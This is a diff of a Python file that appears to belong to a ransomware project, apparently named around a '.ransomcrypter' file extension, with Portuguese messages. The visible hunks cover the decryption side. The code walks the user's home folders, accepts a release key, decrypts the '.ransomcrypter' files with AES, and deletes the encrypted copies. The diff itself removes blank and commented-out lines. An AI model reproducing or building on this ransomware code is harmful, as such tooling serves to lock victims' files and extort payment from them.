@@ -34,43 +34,29 @@ def varer():
         for filename in Path(base_path).rglob(t):
             pastas.append(form(filename))
     return pastas
-
-
 lst_past=varer()
-
-
-
-
-
-
 os.listdir(Path.home())
 for o in os.listdir(Path.home()):
     lst_past.append(o)
-
 def descrypt(decrypt_file):
     try:
         for file in glob.glob('*.ransomcrypter'):
-
             keybytes = decrypt_file.encode()
             name_file = open(file, 'rb')
             file_data = name_file.read()
             dkey = keybytes  # 16 bytes key - change for your key
             daes = pyaes.AESModeOfOperationCTR(dkey)
             decrypt_data = daes.decrypt(file_data)
-
             format_file = file.split('.')
             new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file
-
             dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
             dnew_file.write(decrypt_data)
             dnew_file.close()
     except ValueError as err:
         print('Chave inválida')
-
 for i in lst_past:
     try:
         desktop = Path.home() / i
-        #download = Path.home() / "Downloads"
     except Exception:
         pass
     try:
@@ -82,6 +68,5 @@ for i in lst_past:
             descrypt(key)
             for del_file in glob.glob('*.ransomcrypter'):
                 os.remove(f'{desktop}\\{del_file}')
-            #os.system('msg * SUCCESSFULLY DESCRIPTOGRAPHED DATA')
         else:
             print('Chave de liberação inválida!!!')
